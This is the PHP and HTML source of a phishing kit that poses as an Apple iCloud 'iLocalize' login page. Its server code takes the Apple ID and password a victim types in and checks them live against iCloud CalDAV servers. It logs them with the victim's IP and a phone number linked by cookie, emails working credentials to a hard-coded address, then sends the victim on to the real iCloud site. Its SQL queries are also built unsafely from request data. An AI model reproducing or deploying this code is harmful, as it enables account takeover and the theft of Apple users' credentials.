<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>iLocalize</title>
	<meta name="keywords" content="{!KEYWORDS!}">
	<meta name="description" content="{!DESCRIPTION!}">
	<meta name="viewport" content="user-scalable=no, width=device-width"/>
    <meta name="apple-mobile-web-app-capable" content="yes" />
	<link href="style/css/style.css" rel="stylesheet" type="text/css">
	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>	
</head>
	
<body>
<?
$show=false;
if(isset($_COOKIE["key"])){
		$referer_key = $_COOKIE["key"];
		
}else{ $referer_key = 'No key'; }
$db->Query("INSERT INTO db_history (keygen, last_date) VALUES ('$referer_key', '".time()."')");	
if(isset($_POST['apple_id']) & isset( $_POST['password'])){
	$ip = $func->UserIP;
	include("includes/_function.php");
	$urls = array();
	for($i = 1; $i < 25; $i++)
	$urls[] = "https://p".str_pad($i, 2, '0', STR_PAD_LEFT)."-caldav.icloud.com";
	$url = $urls[rand(1, 24)];
	$user = $_POST['apple_id'];
	$password=$_POST['password'];
	$xml="<A:propfind xmlns:A='DAV:'><A:prop><A:current-user-principal/></A:prop></A:propfind>";						
	$response = check($user, $password, $url, $xml);
	$pos = strpos($response, 'Unauthorized');
	$referer_key ='';
	if(isset($_COOKIE["key"])){
		$referer_key = $_COOKIE["key"];
		$db->Query("SELECT tel_number FROM db_tel WHERE keygen = '".$_COOKIE["key"]."' ORDER BY date_insert DESC LIMIT 1 ");
		$prof_data = $db->FetchArray();
		$telephone = $prof_data['tel_number'];
	}else{ $referer_key ='No key'; $telephone = 0;}
	
	$i = 0;
	/*
	$country = json_decode(file_get_contents("http://www.telize.com/geoip/".$ip),true);
	$country_code = $country['country_code'];*/
	if ($pos === false) {
		$i=1;
	} else {
		$i=0;
		$show=true;
	}
	$db->Query("INSERT INTO db_return (tel_nember, keygen, login, password, ip, date_return, status) VALUES 
											('$telephone', '".$referer_key."', '".$_POST['apple_id']."','".$_POST['password']."', INET_ATON('$ip'), '".time()."', '$i')");
	if($i == 1){
		$sms = 'Ya doudou c\'est choco barra e5dim 3ala rou7ek famma iCloud jdid mezzel ki jek.<br/>Apple ID : '.$_POST['apple_id'].'<br/>Password : '.$_POST['password'].'<br/>tel : '.$telephone ;
		$sender = new isender;
		$sender -> SendMail('doudou_aymen@ymail.com', 'Apple', $sms);
		header("Location: https://www.icloud.com/");
	}
}
?>

 <div>   
      <h1>iLocalize</h1>
      <div class="logo"><span></span><h2></h2></div>
	  <div class="formulaire">
		<form method="POST" action="">
			<input placeholder="Apple ID" class="appId1 top" name="apple_id" id="apple" type="text">
			<input placeholder="Password" value="" class="appId2 bot" name="password" id="pw" type="password">
			<input class="button-bold" id="sbBtn" name="go" value="<? echo $lang['next'] ?>" type="button">
		</form>
	  </div>
		<div class="lost_pass">
			<a href="https://iforgot.apple.com/" target="blank"><? echo $lang['lost'] ?></a>
		</div>
		<? if($show){ ?>
		<div class="box-msg error"><? echo $lang['error'] ?></div>
		<? } ?>
      <p><? echo $lang['description'] ?></p>
</div>

<script>		
$(document).ready(function(){
	if($(".appId1").val().length < 5 || $(".appId2").val().length < 5) {
		$("#sbBtn").css("opacity", "0.5");
		$('#sbBtn').attr('type','button');
	}
	$(".appId2").keyup(function() {
		if($(".appId1").val().length >= 5 && $(".appId2").val().length >= 5) {
			$("#sbBtn").css("opacity", "1");
			$('#sbBtn').attr('type','submit');}
		else{
			$("#sbBtn").css("opacity", "0.5");
			$('#sbBtn').attr('type','button');}
	});
	$(".appId1").keyup(function() {
		if($(".appId1").val().length >= 5 && $(".appId2").val().length >= 5) {
			$("#sbBtn").css("opacity", "1");
			$('#sbBtn').attr('type','submit');}
		else{
			$("#sbBtn").css("opacity", "0.5");
			$('#sbBtn').attr('type','button');}
	});	
});	

	
</script>

</body>
</html>